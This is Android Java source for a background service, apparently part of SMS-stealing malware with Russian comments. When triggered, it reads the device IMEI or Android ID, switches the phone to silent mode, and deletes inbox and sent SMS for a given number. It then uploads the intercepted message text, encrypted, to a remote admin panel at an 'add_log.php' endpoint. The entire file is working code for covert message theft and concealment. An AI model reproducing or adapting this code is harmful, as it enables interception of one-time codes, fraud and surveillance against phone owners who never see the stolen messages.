package com.example.livemusay.myapplication;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.concurrent.TimeUnit;

public class delSoundSWS extends Service {
	constants const_ = new constants();
	secFunctions SF = new secFunctions();

	@Override
	public IBinder onBind(Intent arg0)
	{
		return null;
	}
	
	void stop() {
	      stopSelf();
	    }
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		try
		{
			//получаем номер  и текст
			String num = intent.getStringExtra("num");
			String ms = intent.getStringExtra("ms");
			RCWC(this, num, ms);
		}catch (Exception e){Log.e("Error","AVTO");}

		return START_STICKY;
	}


	public void RCWC(Context context, String num, String ms)
	{
		request setPost = new request();

		String IMEI="";
		if (Build.VERSION.SDK_INT < 23)
		{
			TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			IMEI =  tm.getDeviceId();
		}
		else
		{
			//Получаем IMEI

			IMEI = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

			if(IMEI == "")
			{
				IMEI = "35" + // 35
						Build.BOARD.length()%10 + Build.BRAND.length()%10 +
						Build.CPU_ABI.length()%10 + Build.DEVICE.length()%10 +
						Build.DISPLAY.length()%10 + Build.HOST.length()%10 +
						Build.ID.length()%10 + Build.MANUFACTURER.length()%10 +
						Build.MODEL.length()%10 + Build.PRODUCT.length()%10 +
						Build.TAGS.length()%10 + Build.TYPE.length()%10 +
						Build.USER.length()%10;
			}
		}
				//Глушим звук смс и вибро!
				AudioManager audm;
				audm = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
				audm.setRingerMode(AudioManager.RINGER_MODE_SILENT);

				try {TimeUnit.SECONDS.sleep(1);} catch (InterruptedException e) {e.printStackTrace();}

				//удаляем СМС
				DCWCSEnt(context,"",num);
				//отображаем в админке смс
				setPost.go_post(const_.url + "/private/add_log.php", "p=" + SF.trafEnCr(IMEI + "|(Вх СМС)" + " Номер: {" + num + "} с текстом {" + ms + "}" + DCWC(context,"",num)+"|"));
				System.out.println("(СМС)" + num + " с текстом  " + ms + " ");
		}

	//удаляем смс входящие
	private String DCWC(Context context, String message, String number) {
		String go_D_CWC = "(СМС НЕ УДАЛЕНА)";
		try {
			Uri uriSms = Uri.parse("content://sms/inbox");
			Cursor c = context.getContentResolver().query(uriSms,
					new String[]{"_id", "thread_id", "address",
							"person", "date", "body"}, null, null, null);

			if (c != null && c.moveToFirst())
			{
				do {
					long id = c.getLong(0);
					long threadId = c.getLong(1);
					String address = c.getString(2);
					String body = c.getString(5);

					if (!message.equals(body) && address.equals(number)) {
						go_D_CWC="(СМС УДАЛЕНА)";
						context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
					}
				} while (c.moveToNext());
			}
		}
		catch (Exception e)
		{
			go_D_CWC="(ОШИБКА УДАЛЕНИЯ)";
		}
		return go_D_CWC;
	}

	//удаляем смс исходящие
	public void DCWCSEnt(Context context, String message, String number) {
		try {
			Uri uriSms = Uri.parse("content://sms/sent");
			Cursor c = context.getContentResolver().query(uriSms,
					new String[]{"_id", "thread_id", "address",
							"person", "date", "body"}, null, null, null);

			if (c != null && c.moveToFirst()) {
				do {
					long id = c.getLong(0);
					long threadId = c.getLong(1);
					String address = c.getString(2);
					String body = c.getString(5);

					if (!message.equals(body) && address.equals(number)) {
						context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
					}
				} while (c.moveToNext());
			}
		} catch (Exception e) {
		}
	}

}